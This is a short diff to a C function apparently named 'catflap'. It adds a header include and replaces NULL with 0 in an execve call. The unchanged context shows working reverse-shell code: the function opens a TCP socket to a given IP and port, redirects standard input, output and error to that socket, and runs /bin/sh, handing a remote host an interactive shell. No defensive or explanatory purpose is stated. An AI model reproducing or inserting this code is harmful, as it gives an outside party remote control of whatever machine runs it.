@@ -1,3 +1,5 @@
+#include <arpa/inet.h> 
+
 int catflap(const char *ip, int port)
 { 
 	int conn_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
@@ -11,7 +13,7 @@ int catflap(const char *ip, int port)
 	dup2(conn_sock, 1);
 	dup2(conn_sock, 2);
 
-	execve("/bin/sh", NULL, NULL); 
+	execve("/bin/sh", 0, 0); 
 	return 0;
 }	
 
